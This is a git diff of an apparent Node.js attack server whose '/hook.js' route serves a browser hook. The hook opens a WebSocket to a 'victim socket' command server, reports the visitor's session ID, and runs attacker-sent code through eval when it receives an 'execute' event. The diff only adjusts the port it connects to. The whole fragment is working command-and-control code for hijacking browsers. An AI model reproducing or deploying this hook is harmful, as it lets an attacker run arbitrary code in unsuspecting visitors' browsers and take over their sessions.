@@ -29,11 +29,11 @@ victimApp.use(function(req, res, next) {
 victimApp.use(express.static(__dirname + '/public'))
 victimApp.get('/hook.js', function(req, res){
   res.write(socketIOClient)
-  res.write(`(function(){const socket = io('ws://${process.env.VICTIM_SOCKET_IP}:${process.env.PORT || 5000}');socket.emit('identify','${req.sessionID}');socket.on('execute',function(data){eval(data.func);attack(data.params);});})();`)
+  res.write(`(function(){const socket = io('ws://${process.env.VICTIM_SOCKET_IP}:${process.env.VICTIM_SOCKET_PORT}');socket.emit('identify','${req.sessionID}');socket.on('execute',function(data){eval(data.func);attack(data.params);});})();`)
   res.end()
 })
 victimServer.listen(process.env.VICTIM_SOCKET_PORT)
-console.log(`Victim socket server listening on ${process.env.VICTIM_SOCKET_IP}:${process.env.PORT || 5000}`)
+console.log(`Victim socket server listening on ${process.env.VICTIM_SOCKET_IP}:${process.env.VICTIM_SOCKET_PORT}`)
 
 
 
